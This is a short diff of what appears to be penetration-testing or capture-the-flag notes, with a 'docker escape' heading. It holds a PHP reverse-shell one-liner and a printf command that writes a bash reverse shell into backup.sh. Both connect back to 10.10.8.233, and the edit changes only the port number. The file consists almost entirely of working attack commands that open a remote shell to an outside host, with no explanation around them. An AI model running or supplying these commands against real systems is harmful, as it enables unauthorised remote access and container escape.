@@ -27,4 +27,4 @@ php -r '$sock=fsockopen("10.10.8.233",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 docker escape
 
-printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.8.233/8080 0>&1' > backup.sh
+printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.8.233/8888 0>&1' > backup.sh
